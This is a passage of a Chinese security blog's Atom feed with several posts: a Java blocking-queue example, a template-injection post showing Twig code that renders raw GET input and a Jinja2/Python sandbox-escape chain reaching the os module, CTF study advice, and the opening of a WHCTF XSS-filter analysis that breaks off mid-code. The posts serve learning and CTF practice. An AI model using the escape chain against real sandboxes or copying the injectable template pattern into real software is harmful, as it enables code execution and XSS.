class="line">&#125;</div></pre></td></tr></table></figure><p>OUTPUT:</p><blockquote><p>取出了1<br>放入了1<br>放入了2<br>取出了2<br>放入了3<br>放入了4<br>取出了3<br>放入了5<br>放入了6<br>取出了4<br>放入了7<br>放入了8<br>取出了5<br>放入了9</p></blockquote><p>可以看到，开始放入了1，然后随即唤醒取线程拿出了1，然后0.5s后放东西线程接着放2….</p><p>这里的显示结果与我们想的有些不同的原因是，从读取操作到输出操作并非一个原子操作，所以输出结果可能与内部存放的步骤有些差异。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Java阻塞队列&quot;&gt;&lt;a href=&quot;#Java阻塞队列&quot; class=&quot;headerlink&quot; title=&quot;Java阻塞队列&quot;&gt;&lt;/a&gt;Java阻塞队列&lt;/h2&gt;&lt;p&gt;最近在学习Java的多线程编程，对并发编程的认识也从之前用python写简单多线程程序里对并发代码块上锁，到生产者消费者模型，wait()，notify()，阻塞队列这些概念，那么这里要介绍的阻塞队列是什么呢？&lt;/p&gt;
&lt;p&gt;考虑生产者消费者模型这种情况，在从队列中取元素与拿元素时加锁，但在这种场景下仅加锁是不够的，因为生产者往里面放元素的时候，还要考虑队列有没有满，如果已经满了的话就要wait一直到队列不满的时候再往里面放，消费者也是一样的，从队列里面拿元素的时候还要考虑队列是不是空的，如果是空的就要一直wait到非空的时候。注意这里我们就从加锁操作引出了wait(), notify()两个概念，在并发编程中结合这两个概念可以实现更多更精巧复杂的多线程场景。&lt;/p&gt;
&lt;p&gt;好像扯得有点远，还没有说到我们要介绍的阻塞队列的概念，其实阻塞队列就源自于生产者消费者模型中所涉及到的场景，在多线程下很多场景都要有一些临界资源，这些资源可能被多个线程同时访问，所以就要进行加锁啊，wait()，notify()等操作，其实个人觉得加锁还好，就是将一个对临界资源操作的语句块圈起来就好，但要实现wait，notify操作就有些麻烦了，放东西的时候需要一直判断是不是满了，满了还要wait，然后操作完了后还要记得唤醒各种线程防止死锁等等，如果都自己实现的话就有点太麻烦了，更重要的是容易出错，所以这里就引入了阻塞队列的概念，不是临界资源的操作需要加锁，判满，判空等等各种操作嘛，那好，临界资源你直接用我给你写的类，我在类里面已经对所有需要处理的多线程场景进行了处理，使其变得线程安全了，使用这种类的话，自己完全不需要考虑多线程的线程安全问题，而这种类就是我们要介绍的阻塞队列。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从模板注入漏洞谈起，到一个烂尾的寻找python沙盒绕过的代码</title>
    <link href="https://someonesometimes.github.io/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/"/>
    <id>https://someonesometimes.github.io/2017/10/21/从模板注入漏洞谈起/</id>
    <published>2017-10-21T10:17:03.000Z</published>
    <updated>2017-10-21T11:05:15.805Z</updated>
    
    <content type="html"><![CDATA[<p>宝宝很烦，代码烂尾了，宝宝并不想说什么</p><a id="more"></a><h3 id="从模板注入漏洞谈起"><a href="#从模板注入漏洞谈起" class="headerlink" title="从模板注入漏洞谈起"></a>从模板注入漏洞谈起</h3><p>不管是什么语言，php也好，python也好，在做前端的时候都会有模板技术，这可以将前端框架与后端所提供的动态值分离，对于后台开发者来说，只需要拿着前端模板然后像””.format()一样，来为里面的参数提供不同的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</div><div class="line"><span class="comment">// 这里面Hello &#123;&#123;name&#125;&#125;就是模板，array("name" =&gt; $_GET["name"])就是在为其赋值</span></div><div class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;&#123;name&#125;&#125;"</span>, <span class="keyword">array</span>(<span class="string">"name"</span> =&gt; $_GET[<span class="string">"name"</span>]));  </div><div class="line"><span class="keyword">echo</span> $output;</div></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</div><div class="line"><span class="comment">// 这种情况是直接填入到里面去</span></div><div class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  </div><div class="line"><span class="keyword">echo</span> $output;</div></pre></td></tr></table></figure><p>上述两种都可以实现填充，然而会存在一种问题：<br>第一种是类似format()的函数实现，大多数模板实现这个功能的时候都会进行转义，所以xss是没法构造的，然而第二种的方式就是将<code>$_GET[&#39;name&#39;]</code>直接放到了模板里面，不会进行转义，所以可以构造xss</p><h3 id="模板可能还支持对应语言的“编程功能”以及一些简单的运算"><a href="#模板可能还支持对应语言的“编程功能”以及一些简单的运算" class="headerlink" title="模板可能还支持对应语言的“编程功能”以及一些简单的运算"></a>模板可能还支持对应语言的“编程功能”以及一些简单的运算</h3><p>模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑</p><p>在Twig中，模板支持运行这样简单的逻辑，如果并没有运行的话，可能是关键字符被过滤，并不是模板不支持这样写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;   name=&#123;&#123;<span class="number">2</span>+<span class="number">2</span>&#125;&#125;</div></pre></td></tr></table></figure><p>而在python的Jinja2模板中，就能支持更多更强大的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</div><div class="line"></div><div class="line">str = <span class="string">"&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;"</span></div><div class="line">template = Template(<span class="string">'your input: &#123;&#125;'</span>.format(str))</div><div class="line"><span class="keyword">print</span> (template.render())</div></pre></td></tr></table></figure><p>是不是感觉很像python的语法？那么是不是我们就相当于拿到了python的任意代码执行？其实还差的远，因为虽然我们能在模板里书写任意代码，但并不是能够调用任意函数，就像python程序里没有import os就不能使用os.system()一样。在Jinja2里如果我们想“import os”，需要这样做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">template.globals[<span class="string">'os'</span>] = os</div></pre></td></tr></table></figure><p>显然我们没有写这种代码的能力。。。但其实还是可以的，我们不用import os模块就能使用os的，这里就需要了解python的沙盒绕过了，也是今天我花时间最多却没搞出来的点。。。</p><h3 id="python沙盒绕过"><a href="#python沙盒绕过" class="headerlink" title="python沙盒绕过"></a>python沙盒绕过</h3><p>还是先大致统计下目前已知的需要用到沙盒绕过的情景</p><ul><li>本文中通过模板引擎注入代码，但没法import，也就相当于限制了一些关键函数的使用</li><li>昨天USTC比赛里见到了python反序列化，所以也相当于可以执行任意代码，只是一些关键的模块被禁用了</li></ul><p><strong>如果程序不从函数注册来判断那些函数可以使用的话，我们可以通过以下过程来得到我们要用的模块或者函数</strong></p><p>通过一个class的各种属性或方法，可以得到很多相关的东西，其中就可能包含我们想要的模块或函数</p><ul><li><code>class.__dict__</code></li><li><code>class.__init__.__globals__</code></li><li><code>class.func_globals</code></li></ul><p>应该还有很多，我们可以自己去测试</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fkq0jmaixzj20i1051q69.jpg" alt=""></p><p>通过<code>class.__class__.__base__.__subclasses__()</code>我们就可以得到很多子类，其实在对上面的方法进行测试的时候，我们有时也可以看到很多类</p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fkq0hprcbhj20id04nt8x.jpg" alt="![img](https://ws1.sinaimg.cn/large/93e435bbly1fkq0hprcbhj20id04nt8x.jpg)"></p><p>于是我们通过一个个跳转，就可以最终找到我们要的函数或者模块，举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [].__class__.__base__.__subclasses__():</div><div class="line">    <span class="keyword">if</span> i.__name__ == <span class="string">"catch_warnings"</span>:</div><div class="line">        <span class="keyword">print</span> i.__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>]</div><div class="line">        </div><div class="line">output:</div><div class="line">  &lt;module <span class="string">'os'</span> <span class="keyword">from</span> <span class="string">'C:\Python27\lib\os.pyc'</span>&gt;</div></pre></td></tr></table></figure><h3 id="考虑实现自动查找定位到一个函数要走的路径"><a href="#考虑实现自动查找定位到一个函数要走的路径" class="headerlink" title="考虑实现自动查找定位到一个函数要走的路径"></a>考虑实现自动查找定位到一个函数要走的路径</h3><p>从前面举的例子来看，我们想找到一个函数很能需要经过很多跳才行，能不能遍历下自动去找呢？</p><p>注意，代码烂尾了。。。最后并没有实现想要的功能，哪里出问题了有说不太清，最后时间预算不够了，就只能烂尾了。。。如果以后有时间再尝试写写吧</p><p>首先阐述下我的实现：</p><p>我们有一个初始类，一般是[]或()，然后通过<code>.__class__.__base__.__subclasses__()</code>扩展成很多的子类，于是我们就维护一个类列表，去遍历分析它，虽然一开始列表里只有一个，但我们对每一个分析的类都去寻找子类并将新找到的类及时添加到列表末尾</p><p>然后在对每个类分析的过程中，尝试通过上面提到的一种获取函数的方法<code>.__init__.__globals__</code>来从中提取函数，如果找到了输出出来，有一点比较复杂的是，在提取函数语句的输出结果中，有很多中可能，有可能我们要的函数是在一个列表或字典中，这时候还需要再深入去分析，所以我就写成了一个递归</p><p>然后就是代码了，烂尾的代码。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> warnings</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">大致的过程：</div><div class="line">- 首先从一个类生成多个类</div><div class="line">- 对类生成各种各样的东西，分这几种类型：</div><div class="line">    - 函数直接看是不是</div><div class="line">    - 类的话，就放到类遍历列表里面去，当然要先判断有没有才行</div><div class="line">    - 字典的话，生成value去再来分析</div><div class="line">    - 列表的话，直接去分析</div><div class="line">"""</div><div class="line"></div><div class="line">class_list = []</div><div class="line">class_original = []</div><div class="line">class_list.append(class_original)</div><div class="line">goal_function = open</div><div class="line"></div><div class="line"><span class="comment">#通过__class__.__base__.__subclasses__生成子class</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subclass</span><span class="params">(_class)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> _class.__class__.__base__.__subclasses__()</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> []</div><div class="line"></div><div class="line"><span class="comment">#从class中通过.__init__.__globals__来得到所有的各种类型的值</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_something</span><span class="params">(_class)</span>:</span></div><div class="line">    <span class="keyword">if</span> hasattr(_class.__init__, <span class="string">'__globals__'</span>):</div><div class="line">        <span class="keyword">return</span> _class.__init__.__globals__</div><div class="line"></div><div class="line"><span class="comment">#递归式的对一个列表进行分析</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_list</span><span class="params">(list)</span>:</span></div><div class="line">    <span class="keyword">if</span> list:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list:</div><div class="line">            <span class="keyword">if</span> type(i) == type([]):</div><div class="line">                analysis_list(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> type(i) == type(&#123;&#125;):</div><div class="line">                analysis_dict(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> hasattr(i, <span class="string">'__call__'</span>):</div><div class="line">                <span class="keyword">if</span> i == goal_function:</div><div class="line">                    <span class="keyword">print</span> (i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="comment">#还不是话，就推断是类了,但是目前还不敢肯定就这几种类型</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">                class_list.append(i)</div><div class="line"></div><div class="line"><span class="comment">#递归式的对一个字典进行分析</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_dict</span><span class="params">(dict)</span>:</span></div><div class="line">    <span class="keyword">if</span> dict:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dict.values() :</div><div class="line">            <span class="keyword">if</span> type(i) == type([]):</div><div class="line">                analysis_list(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> type(i) == type(&#123;&#125;):</div><div class="line">                analysis_dict(i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> hasattr(i, <span class="string">'__call__'</span>):</div><div class="line">                <span class="keyword">if</span> i == goal_function:</div><div class="line">                    <span class="keyword">print</span> (i)</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="comment">#还不是话，就推断是类了,但是目前还不敢肯定就这几种类型</span></div><div class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">                class_list.append(i)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> class_list:</div><div class="line"><span class="comment">#首先增加一波子类</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> get_subclass(i):</div><div class="line">        <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> class_list:</div><div class="line">            class_list.append(j)</div><div class="line">    <span class="comment"># print class_list</span></div><div class="line"></div><div class="line">    <span class="comment">#开始对这个类进行分析查找</span></div><div class="line">    analysis_dict(get_something(i))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;宝宝很烦，代码烂尾了，宝宝并不想说什么&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给信息安全入门者的一点建议</title>
    <link href="https://someonesometimes.github.io/2017/10/01/%E7%BB%99%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E8%80%85%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BB%BA%E8%AE%AE/"/>
    <id>https://someonesometimes.github.io/2017/10/01/给信息安全入门者的一些建议/</id>
    <published>2017-10-01T15:45:00.000Z</published>
    <updated>2017-10-09T15:57:00.069Z</updated>
    
    <content type="html"><![CDATA[<p>这是给学校里学弟学妹们写的，师傅们就别看了orz。。</p><a id="more"></a><p>首先要声明的是，我的水平也不高，如果非要说比你们有什么优势的话，也就是早学了一两年而已，说实话我也不知道自己现在有没有真正入门，因为每搞清楚一个方面后，又随即会发现还有很多新的方向需要学习。总之信息安全并不是一门容易学好的学科，从现状来看，可以说90%人一直到了大四毕业也没有真正的入门安全，50%的人荒废学业，一事无成，另40%的人按照学校的课程开设安排学习而没有自己的一点见解最后成为了一名程序员2333，所以在你们入门安全之前，有件事情一定要想好————你们是否真的未来打算从事安全行业？我身边有太多同学编的一手好程序，精通算法数据结构，他们的大学也很充实，但就专业来说，他们最后并没有选择信息安全方向.这并没有任何问题，只是个人的选择而已，所以同学们，如果你们并没有对安全多么感兴趣，按照你们自己的想法学就好，最后的信息安全方向并不是每个人都一定要走的，无论是什么方向，大学四年没有荒废，能学得一技之长就OK。</p><p>下面我会基于自己的学习经历，把我摸索出的路讲给你们，其中有一些很关键，还有一些只是个人的一点想法或者说面对岔路的选择，自取吧</p><p>作为之前没有任何安全知识与基础的大学生，编程是首先也是必须要学习的，这是立足之本，不仅要学，还要学好，学广，面对别人写的程序，如果你连代码都看不懂又谈何挖掘其中的漏洞呢？所以信息安全从业者必须能写得一首好代码，而且懂得多门编程语言，这点上学校只会教授C++与Java，其他的是你们要自己去学的</p><p>还有一点是这四年时间的安排问题，我们在大四的时候才会开设诸如计算机病毒学，网络攻防这些课程，很显然对于一个毕业后面向社会的大学生太晚了，所以就要提前自学，那么我们需要学习什么呢？首先如果没有基础的话肯定不能上来就搞安全，以我自身为例，我选择的网络安全方向，那么就需要学习计算机网络，网站相关的前端语言如JavaScript，学习HTML，学习至少一种服务端语言（我选择的PHP），然后至少要熟练的掌握一门脚本语言，这里大部分人都选择的Python，当然你也可以使用C++，Java这些作脚本语言用，但其实就算选择其他脚本语言的话，作为一名黑客，不懂Python总感觉还差那么一回事。以上就是在正式入门安全之前需要掌握的知识，上面提到的任何一方面如果没有接触过的话，做安全时都会感觉难以下手，就像你小学面对一篇高考英语阅读一样寸步难行。 是不是感觉要学很多东西？还差的远那，这些只是最基础的，安全人员在工作中会遇到各式各样的程序员写出来的产品，如果对方所用的知识你没有接触过或者短时间内学不懂的话，是根本无从下手的，所以对于新知识，安全从业人员需要具备快速学习掌握的能力，如果之前就接触过的话是最好的，所以平时也要接触各种新技术才行。<br>好像扯得有点远了，除了向你们展示要学习的基础知识，还有一点是希望大家考虑下：你学完这些的时候得大几了？反正我大概是大二上学期才学习完的这些知识，之后才正式接触了安全，虽然可能学长们会提前教你们一些安全知识，但不要忘了上面的基础知识是入门安全必要的，这一点在你们接触到安全知识时会有所体会<br>对了，有一点忘说了，怎么学习这些基础知识呢？计算机网络的话需要着重掌握HTTP协议，过于底层的通信方式放在大三的计算机网络课中正式学习也不迟。那些编程语言的话，简单了解变量定义，控制结构就可以了，剩下更多的放到安全知识中用到了什么再深究什么也是不错的选择</p><p>OK，到这里就可以正式开始介绍安全入门了，如果你是大牛的话，直接去各大漏洞提交平台给企业挖洞就行，不过我想大家和我一样都还没达到那种水平，那么怎么磨练自己的专业技能呢？这里就要介绍到一种名为CTF的比赛了，CTF也就是夺旗赛，比赛举办方提供服务器让参赛选手去攻击，选手组队参赛，每成功拿到“旗”，也就是比赛中所称的flag，提交给举办方通过后就会获得相应的分数，最后排名按照分数来计算，CTF是安全行业中很常见的赛事，不仅学生会参加，很多安全行业从业人员也会参与到其中，在这里你可以磨练自己的安全技能，从而得到提高，借用Ven牛的一句话说，CTF是信息安全最好的入门方式了，没有之一，其实这也是我们为大家举办培训的初衷，这些一会我会放在最后来说。</p><p>从我自身打CTF的经历来说，前期会感觉很困难，在做题目的时候四处碰壁，这是因为你还没有真正入门，但如果坚持不下来的话，你永远也入不了安全行业的大门，那么坚持做什么呢？CTF比赛在国内有一个XCTF联赛，自己google网址，国内大部分有影响力的CTF赛事都在其中，而我们要做的，就是坚持跟着把每场比赛做下来，赛后认真的吃透每一道题目，吃透每一道题目，吃透每一道题目，重要的话三遍！你可以不参加比赛，但结束后一定要在答案出来之后马不停蹄的分析题目，学习里面的知识，尤其是web题目，因为web环境很少能维护很长时间，一般三天内题目环境肯定会关闭（二进制题目就另说了），所以需要及时的照着答案吃透题目，否则之后就只能干看答案了。客观来说XCTF联赛里的题目不简单，我自己的话好的时候一场比赛下来能做出来一两道就不错了，但这不是关键，怕的不是做不出来，而是赛后没有回顾消化题目，让这场比赛白白浪费了。如果大家觉得一开始做XCTF联赛里的题目有些难的话，也可以从实验吧，i春秋等训练平台上吃透一些题，但个人觉得还是要做真正比赛中的题目才是最有效的，因为这种比赛中的题目质量更高，也更能学到东西。</p><p>就着上面对在比赛中学习的阐述，大家应该警醒一些，从前几次的培训结果来看，好像同学们就满足于听上我们一两个小时的讲解就算完了，课下不去练习，我可以很明确的告诉诸位，这样的学习效果近乎为零！不要指望着我们能教授给你们什么体系完善，逻辑上难度上都阶梯上升的知识，毕竟我们不是专业的老师，专业水平也没有那么强，拿我自己来说，你们觉得我近一年的专业学习，几十场比赛经验能在几次培训中讲出来？最多最多最多，我们也只能充当一个领路人的角色，告诉你们需要学什么，大致的框架是什么，去哪里学，难度有多少，剩下的是要你们自己走的，信息安全本来就是一个要求自学能力的科目，没听说过哪个大佬是在培训中学出来的，要知道优秀的程序员永远都是野生的，黑客更是这样。如果你觉得这些实现气起来很困难，或者说与自己的学习方式不符，那么只能说信息安全不太适合你，这并不是贬义，每个人都应该找到适合自己的学习方向嘛，既然这样了为什么要一头扎死在信息安全行业中呢，去寻找适合你自己的学习方式的方向吧。</p><p>其实说到课下的自主学习，也并不只是打比赛，赛后总结学习题目，还有很多，下面我会一一介绍</p><p>除了那种大型的CTF赛事外，还有很多小型的比赛以及国外的比赛，以及实验吧，i春秋，合天等一众信息安全教育平台上的题目，手痒时可以做做。。。</p><p>然后就是很重要的博！！客！！，在CTF你总会见到一些明星队伍，清华的，上海交通大学的，浙江大学的，北航的，北邮的等等等等，这些队伍里面都有一些很厉害的人，他们中很多人都在维护着自己的博客，博客中会有他们写的一些比赛答案的文章（这是我们赛后找答案的好地方），一些经典漏洞的分析，一些笔记总结，一些人生感悟（这个就算了）啥的，在没有比赛的时候，其实我更推荐你们去这里面学习，就算里面都是很久之前，已经没有题目环境的比赛答案，从中学习还是很有必要的，就我自己来说，所学习到的知识，从比赛中与从博客中是五五开的。另一个角度来说，看博客是了解CTF圈子最好的途径，没有之一，你可以了解到那些在比赛中把你虐的不要不要的真大佬们，如果能和他们联系上混好关系，对自己之后的发展是非常有帮助的。额，人际关系方面我们还是一会再说吧，那么从哪里找到这些博客呢？其实很简单，博客与博客之间会有友链，如果你有一个博客链接，就能找到很多大佬的博客，然后你就会发现整个圈子也就那么小，不同队伍的大佬之间都互相非常熟悉，就比如浙大的小m师傅和福州大学ROIS队伍的蓝猫师傅就是一对好基友2333。初始链接的话就从这个开始吧，<a href="http://bendawang.site/，这是一个给过我很多帮助的师傅，也非常羡慕他的水平。" target="_blank" rel="external">http://bendawang.site/，这是一个给过我很多帮助的师傅，也非常羡慕他的水平。</a></p><p>再然后。。其实就和现在有些远了，在你的水平达到一定程度之后，可能就会关注更多的不仅限于CTF方面的安全知识（其实从ctf题目的趋势来看，高质量的CTF比赛赛题也会越来越多的涉及到这些），比如各种安全会议的PPT文稿，最新爆出的漏洞分析，360，阿里，腾讯这些安全大厂写的一些比较有深度的安全文章，如果英文过关的话，还有很多国外黑客的研究成果可以看，如果技术足够的话，还可以去漏洞提交平台提交漏洞等等。目前我自己也还没有到这种水平，正在朝这方面努力吧，看时间够不够了，大学四年真的很短，如果想学点什么东西的话。</p><p>嗯嗯，差不多了，然后我们可以聊一些不那么“切实际”的东西，但这些也很重要，希望大家能记住<br>最想说的还是信息安全这个圈子的人际关系，刚才也提到了，当你技术达到一定水平后，其实圈子也就那么小，大家在比赛中互相切磋，也都互相认识，每个人都有自己的称呼，大家在一个群里聊天的时候也总是师傅长师傅短的称呼（好像这个行业很流行说自己菜，然后膜拜各路大佬？），真的打到了一定水平其实根本就不用担心就业问题，因为你在圈子里都已经很熟了，会有很多在360，阿里的师傅直接把你内推了，当然这一切都要建立在你足够强的基础上。所以认识人，多交流是很重要的，也是必须的，自己闷头学不仅认识不了人，而且也不一定能学的好，你需要接触更多的人来扩宽你的眼界。容易一点的做法是加入各种CTF比赛的交流群，从日常聊天中就能知道那些是大佬，更有效的方式是直接去找这些人去聊天，和他们混好关系，但这种方式比较难，为什么呢？一方面式因为他们本身很厉害的话就会有很多人来找他们聊，就不一定能顾得上你，更重要的原因在于自己，谁让自己那么菜？交流是双向的，如果只是一方的单向付出的话就很难实现，尤其是和你完全不认识的陌生人，也就只有和你有些关系的人，和你们的学长会这样做了。。。因为学校里没有大佬所以我很早就和外面的人交流了，也认识了一个愿意带我的师傅，还是蛮幸运的，不过话说回来，真的学习还是得靠自己，我和我师傅的聊天也就只是比赛结束之后找他聊思路，没事聊些动漫啥的。。。</p><p>差不多可以收尾了，在最后是我想说的一件最重要的事情：为什么我们为大家会开办培训<br>其实讲真我们的学习也很忙，比赛，项目，考研等很多事要做，但我们不得不做这个培训，从之前对CTF比赛的介绍大家应该也能知道，有很多的明星队伍，他们都是一些很厉害的学校里的队伍，这些队伍每年都会纳入新的成员，然后老手带新手，这样一届届的延续下去，这对学校的安全氛围是一个很好的引导作用，所以他们慢慢的也会变得越来越强，在更多更大型的，甚至在世界性的舞台上展露头角，我们称这些学校是信息安全强校，清华，上交，浙大，北航，北邮，西电，武汉大学，杭电，福州大学都在此列，很显然我们学校不是，我们没有一个好的信息安全专业氛围，没有自己的队伍，没有一届带一届的模式来培养新人，甚至没有自己的信息安全协会，每一届的学生靠自己努力达到了一定程度，然后毕业后什么都没留下，下一届还是重复着上一届的样子，我们之前是有在全国信息安全比赛中获得一等奖的学长，也有在全国作品赛中获一等奖的学长，但对现在的我们有什么影响？只是几块宣传牌罢了，所以到了我们这一届则希望尽量改变这种状况，你们可以看到小路学长在这学期创办的信息安全部，我们为大家做培训，其实这些都是希望在我们自己的水平上帮助大家，能在你们接下来的几届中引燃一些安全氛围的火苗，虽然我们水平有限，放在一些强队里也都是给大佬端茶送水的角色，但这仍然是我们必须要做的，这就是我之前在培训中想说的情怀性的东西，但一直没有说出来，希望大家不要把这次培训只是看作知识的传授，在我们毕业的时候，希望你们都能学有所成，接下我们手中的火把，延续下去。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是给学校里学弟学妹们写的，师傅们就别看了orz。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS前端防御———对WHCTF中xss题目filter.js的分析</title>
    <link href="https://someonesometimes.github.io/2017/09/19/XSS%E5%89%8D%E7%AB%AF%E9%98%B2%E5%BE%A1%E2%80%94%E2%80%94%E2%80%94%E5%AF%B9WHCTF%E4%B8%ADXSS%E9%A2%98%E7%9B%AEfilter-js%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <id>https://someonesometimes.github.io/2017/09/19/XSS前端防御———对WHCTF中XSS题目filter-js的分析/</id>
    <published>2017-09-19T15:15:14.000Z</published>
    <updated>2017-10-01T16:39:06.235Z</updated>
    
    <content type="html"><![CDATA[<p>最早的时候是从今年的Bctf的xss题目中遇到的filter.js这种过滤形式，但当时对xss题目一直全程懵逼所以也没有留下代码来好好分析过这种过滤，这次Ben师傅出的xss题目恰好使用了这种防御机制，于是打算好好整理一下。（PS：一看到题目的背景图片就知道这题一定是Ben师傅出的，赛后一问果然是2333）<br>这种前端的XSS防御主要由两部分构成：</p><ul><li>静态检测</li><li>动态检测</li></ul><a id="more"></a><h2 id="首先阐述下filter-js这种的前端xss防御基本原理："><a href="#首先阐述下filter-js这种的前端xss防御基本原理：" class="headerlink" title="首先阐述下filter.js这种的前端xss防御基本原理："></a>首先阐述下filter.js这种的前端xss防御基本原理：</h2><p>在HTML文档的最开头部分就引入这些js代码，需要保证在这些代码执行的时候敏感标签还没有生成，只有这样才会触发我们的检测，比如最简单的一个html文件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self' 'unsafe-inline';style-src 'self' 'unsafe-inline';img-src *;"</span>&gt;</span></div><div class="line">//注意我们尽早的引入了filter.js，使其在下面的标签还没有渲染的时候就开始执行了，这样才能够成功监测到之后标签的各种行为</div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'filter.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Phone<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> sdsd<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"flag.php"</span> <span class="attr">id</span>=<span class="string">"xie"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span 